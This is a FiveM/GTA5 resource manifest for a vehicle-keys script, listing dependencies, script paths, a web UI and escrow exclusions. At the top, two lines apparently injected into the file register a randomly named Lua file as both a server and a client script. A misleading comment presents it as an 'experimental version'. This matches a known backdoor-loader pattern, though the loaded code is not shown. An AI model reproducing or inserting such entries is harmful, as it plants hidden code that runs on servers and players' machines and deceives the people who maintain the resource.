server_script "9DSZNQIHK9CTV.lua"
client_script "9DSZNQIHK9CTV.lua"
--This Is An Expermental Version Of The Script And Is Not For Release, If You Have This It Is Not The Full Script.

fx_version 'cerulean'
game 'gta5'
lua54 'yes'
name "MrNewbVehicleKeys"
author "MrNewb"
version "2.5.19"

shared_scripts {
	'@ox_lib/init.lua',
	'src/shared/config.lua',
	'src/shared/FobOptions.lua',
	'src/shared/ParkingSpots.lua',
	'src/shared/init.lua',
}

client_scripts {
	'src/client/**/*.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'src/server/**/*.lua',
}

ui_page 'web/build/index.html'

files {
	'locales/*.json',
	'web/build/index.html',
	'web/build/**/*',
}

dependencies {
    '/onesync',
    'ox_lib',
	'community_bridge',
    'oxmysql',
}

escrow_ignore {
	'src/shared/*.lua',     	-- Config files
	'src/client/open/*.lua',   -- open files
	'src/server/open/*.lua',   -- open files
}
dependency '/assetpacks'